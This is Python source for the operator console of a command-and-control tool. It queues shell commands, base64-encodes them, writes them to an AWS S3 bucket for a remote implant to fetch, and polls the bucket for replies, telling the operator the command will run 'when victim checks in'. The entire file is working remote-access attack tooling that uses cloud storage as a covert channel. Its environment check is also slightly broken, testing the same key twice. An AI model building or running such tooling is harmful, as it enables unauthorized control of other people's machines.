from cmd import Cmd
from C2Fetcher import C2Fetcher
from threading import Thread
from base64 import b64decode, b64encode
import boto3, os, sys

BUCKET="my-archives-packets-linux"
KEY ="mypage"
s3Client = boto3.client('s3')

class MyPrompt(Cmd):
    def __init__(self):
        self.prompt = 'shell> '
        self.intro = "Queue in commands to be executed"
        self._start_server()
        Cmd.__init__(self)
    
    def _start_server(self):
        respKey = "%s_resp.txt" % KEY
        s = C2Fetcher(s3Client, BUCKET, respKey)
        t = Thread(target=s.start)
        t.daemon=True
        t.start()
        self._send_data("")

    def do_exit(self, inp):
        print("Quitting..")
        return True
    
    def help_exit(self):
        print('Exit the application. Shortcut: Ctrl-D.')
    
    def emptyline(self):
         pass
    
    def _send_data(self, input):
        reqKey = "%s_req.txt" % KEY
        try:
            s3Client.put_object(Body=b64encode(input.encode()), Bucket=BUCKET, Key=reqKey)
        except Exception as err:
            print(err)
            sys.exit(-1)

    def default(self, input):
        if input == 'exit':
            return self.do_exit(input)
        self._send_data(input)
        print("Will execute %s when victim checks in " % input)
         
    do_EOF = do_exit
    help_EOF = help_exit
 
if __name__ == '__main__':
    if len(os.environ["AWS_ACCESS_KEY_ID"]) < 1 or len(os.environ["AWS_ACCESS_KEY_ID"]) < 1:
        print("PLease setup environment variables AWS_SECRET_ACCESS_KEY and AWS_ACCESS_KEY_ID")
        sys.exit(-1)
    MyPrompt().cmdloop()